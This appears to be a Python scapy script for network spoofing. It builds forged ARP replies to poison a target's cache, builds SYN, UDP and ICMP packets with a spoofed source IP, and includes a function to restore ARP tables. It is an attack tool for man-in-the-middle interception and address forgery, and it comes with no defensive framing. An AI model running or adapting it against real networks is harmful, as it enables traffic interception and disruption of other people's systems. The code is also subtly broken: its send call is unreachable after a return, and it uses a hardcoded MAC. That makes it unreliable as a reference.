import scapy.all as scapy
import time
import random
  
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc

  
def spoof(target_ip, spoof_ip, protocol, packet_amount):
    src_port = random.randint(1024, 65535)  
    packet = None 
    try:
        if(protocol == "TCP/IP"):
            packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.TCP(sport = src_port, dport = 80, flags='S')
        elif(protocol == "ARP"):
            packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = "4d:cc:6a:4b:8d:b0", psrc = spoof_ip)
        elif(protocol == "UDP"):
            packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.UDP(sport = src_port, dport = 53)
        elif(protocol == "ICMP"):
            packet = scapy.IP(src = spoof_ip, dst = target_ip)/scapy.ICMP()
    except Exception as e:
        print(e)
    return packet

    
    scapy.send(packet, verbose = False)
    return
  
  
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)
      

    